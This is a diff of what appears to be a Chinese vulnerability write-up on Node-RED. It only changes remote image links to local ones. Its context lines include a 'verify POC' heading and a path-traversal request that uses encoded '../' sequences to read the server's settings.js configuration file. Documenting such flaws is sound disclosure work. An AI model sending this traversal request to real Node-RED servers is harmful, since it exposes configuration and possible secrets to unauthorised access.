@@ -24,7 +24,7 @@ title="Node-RED"
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101928889.png)
+![](./images/202202101928889.png)
 
 验证POC
 
@@ -35,8 +35,8 @@ title="Node-RED"
 /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101928013.png)
+![](./images/202202101928013.png)
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101928766.png)
+![](./images/202202101928766.png)
